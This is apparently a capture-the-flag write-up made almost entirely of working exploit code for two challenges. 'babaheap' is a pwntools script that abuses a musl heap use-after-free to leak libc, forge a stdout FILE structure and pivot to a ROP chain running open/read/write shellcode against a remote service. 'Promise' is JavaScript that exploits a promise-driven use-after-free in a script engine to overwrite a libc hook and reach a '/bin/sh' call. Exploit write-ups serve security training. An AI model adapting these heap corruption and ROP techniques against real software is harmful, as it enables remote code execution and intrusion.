## babaheap
```python
#encoding:utf-8
from pwn import *
import re

ip = '1.116.236.251'
port = 11124
local = 0
filename = './babaheap'
libc_name = './libc.so.1'

def create_connect():
	global io, elf, libc

	elf = ELF(filename)
	context(os=elf.os, arch=elf.arch)
	
	if local:
		io = process(filename)
		libc_name = './libc.so.1'

	else:
		io = remote(ip, port)
		libc_name = './libc.so.1'

	try:
		libc = ELF(libc_name)
	except:
		pass

cc = lambda : create_connect()
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
g = lambda x: gdb.attach(io, x)

r = lambda : io.recv(timeout=1)
rr = lambda x: io.recv(x, timeout=1)
rl = lambda : io.recvline(keepends=False)
ru = lambda x : io.recvuntil(x)
ra = lambda : io.recvall(timeout=1)
it = lambda : io.interactive()
cl = lambda : io.close()

def regexp_out(data):
    patterns = [
        re.compile(r'(flag{.*?})'),
        re.compile(r'xnuca{(.*?)}'),
        re.compile(r'DASCTF{(.*?)}'),
        re.compile(r'(WMCTF{.*?})'),
        re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'),
    ]

    for pattern in patterns:
        res = pattern.findall(data.decode() if isinstance(data, bytes) else data)
        if len(res) > 0:
            return str(res[0])

    return None

def allocate(size, content=b'A'):
	sla(b'Command: ', b'1')
	sla(b'Size: ', str(size).encode())
	if size == len(content):
		sa(b'Content: ', content)
	else:
		sla(b'Content: ', content)

def no_send_allocate(size, content=b'A'):
	sla(b'Command: ', b'1')
	sla(b'Size: ', str(size).encode())
	if size == len(content):
		s(content)
	else:
		sl(content)

def update(idx, size, content=b'A'):
	sla(b'Command: ', b'2')
	sla(b'Index: ', str(idx).encode())
	sla(b'Size: ', str(size).encode())
	if size <= 1:
		return 

	if size == len(content):
		sa(b'Content: ', content)
	else:
		sla(b'Content: ', content)

def delete(idx):
	sla(b'Command: ', b'3')
	sla(b'Index: ', str(idx).encode())

def view(idx):
	sla(b'Command: ', b'4')
	sla(b'Index: ', str(idx).encode())
	ru(b': ')
	return ru(b'\n1. Allocate')[:-12]

def pwn():
	cc()
	#g('b *$rebase(0x16C9)\nb *$rebase(0x187E)\nb *$rebase(0x194E)\nb *$rebase(0x1A38)\n')
	allocate(0x1b0) # 0
	allocate(0x1b0) # 1
	
	allocate(0x100) # 2
	allocate(0x100) # 3

	allocate(0x120) # 4
	allocate(0x120) # 5
	allocate(0x120) # 6

	#g('b *$rebase(0x16C9)\nb *$rebase(0x187E)\nb *$rebase(0x194E)\nb *$rebase(0x1A38)\n')
	delete(0)
	update(0, 1)
	delete(2)

	#g('b *$rebase(0x16C9)\nb *$rebase(0x187E)\nb *$rebase(0x194E)\nb *$rebase(0x1A38)\n')
	allocate(0x1b0) # 0
	allocate(0x1b0) # 2
	delete(4)
	
	#g('b *$rebase(0x16C9)\nb *$rebase(0x187E)\nb *$rebase(0x194E)\nb *$rebase(0x1A38)\n')
	chunk_0x120 = u64(view(2)[0x18:0x20])
	log.success('No.4 chunk: 0x%x', chunk_0x120)
	libc.address = chunk_0x120 - 0xb38d0
	log.success('libc_addr: 0x%x', libc.address)

	data_segment = libc.address + 0xb0000
	stdout = libc.address + 0xb0280
	mprotect = libc.address + 0x41DC0

	log.success('stdout: 0x%x', stdout)
	my_chunk = libc.address + 0xb0b10
	log.success('my_chunk: 0x%x', my_chunk)
	chunk_6 = libc.address + 0xb3b50

	fake_chunk = stdout - 0x10
	# 任意写伪造 stdout 首部
	update(4, 0x11, p64(fake_chunk - 0x18) + p64(fake_chunk - 0x08))
	allocate(0x120) # 4
	
	#g('b *$rebase(0x16C9)\nb *$rebase(0x187E)\nb *$rebase(0x194E)\nb *$rebase(0x1A38)\n')
	delete(6)
	update(6, 0x30, p64(fake_chunk - 0x10) + p64(my_chunk+0x8))

	update(2, 0x150, p64(0)*3+p64(chunk_6)+p64(my_chunk+0x8))
	allocate(0x120) # 6 -----> 通过 unbin，将 stdout_FILE 送上 head 位置
	#g('b *$rebase(0x16C9)\nb *$rebase(0x187E)\nb *$rebase(0x194E)\nb *$rebase(0x1A38)\n')

	# mov     rdx, [rdi+30h];mov     rsp, rdx;mov     rdx, [rdi+38h];jmp     rdx
	stack_mig = libc.address + 0x78D24
	ret = libc.address + 0x15292

	pop_rdi = libc.address + 0x15291
	pop_rsi = libc.address + 0x1d829
	pop_rdx = libc.address + 0x2cdda
	pop_rax = libc.address + 0x16a16
	syscall = libc.address + 0x23720
	rop_chain = libc.address + 0xb3a20

	rop = flat([
		pop_rdi, data_segment,
		pop_rsi, 0x8000,
		pop_rdx, 7,
		mprotect, rop_chain+0x40
		])
	rop += asm(shellcraft.open('/flag'))
	rop += asm(shellcraft.read(3, data_segment, 0x100))
	rop += asm(shellcraft.write(1, data_segment, 0x50))

	update(5, 0x100, rop)

	poc = flat({
    	0x30: 1,		# f->wpos
    	0x38: 1,		# f->wend
    	0x40: rop_chain, 
    	0x48: ret, 
    	0x58: stack_mig,# f->write
    	0x70: 1,		# f->buf_size
	}, filler=b'\x00', length=0x120)

	# g('b *$rebase(0x16C9)\nb *$rebase(0x187E)\nb *$rebase(0x194E)\nb *$rebase(0x1A38)\nb *(0x%x)'%(stack_mig))
	# chunk 7 -----> 分配到 stdout_FILE
	no_send_allocate(0x120, poc)

	log.success('flag: %s', regexp_out(ru(b'}')))
	# flag{use_musl_4ft3r_fr33}
	cl()

if __name__ == '__main__':
	pwn()
```

## Promise
```javascript
const hex = (x) => {return ("0x" + x.toString(16))};
let a0, a1;

function f2() {
	console.log('Resolve Two');
	const abs = [];
	a0 = undefined;
	for (let i = 0; i < 8; i++) abs.push(new ArrayBuffer(8));; 
	
	const tas = [];
	for (let i = 0; i < 8; i++)
	{
	  const ta = new Uint32Array(abs[i]);
	  ta[0] = 1852400175;
	  ta[1] = 6845231; 
	  tas.push(ta);
	}

	const libc_addr = a1[0xa0/4]+(a1[0xa0/4+1] * 0x100000000) - 0x3ec1e0
	console.log(hex(libc_addr));
	
	a1[0x458/4] = (libc_addr + 0x3ed8e8) & 0xffffffff;
	a1[0x458/4+1] = ((libc_addr + 0x3ed8e8) - a1[0x1d8/4]) / 0x100000000;	
	tas[3][0] = (libc_addr + 0x4f550) & 0xffffffff;
	tas[3][1] = ((libc_addr + 0x4f550) - tas[3][0]) / 0x100000000;
	console.log('Finished!')

}

function f1(a) {
	console.log('Resolve One');

	arr = undefined; 

	a0 = new Uint32Array(a);

	a1 = a0; 

	let p = new Promise((resolve, reject) => {
		console.log('Resolve Two Init');
		resolve(0);
	});
	p.then(f2);
}

let arr = new ArrayBuffer(0xa00);
function main() {
	let p = new Promise((resolve, reject) => {
		console.log('Promise Init');
		resolve(arr);
	});
	p.then(f1);
	console.log('Main Finished');
}

main();
```
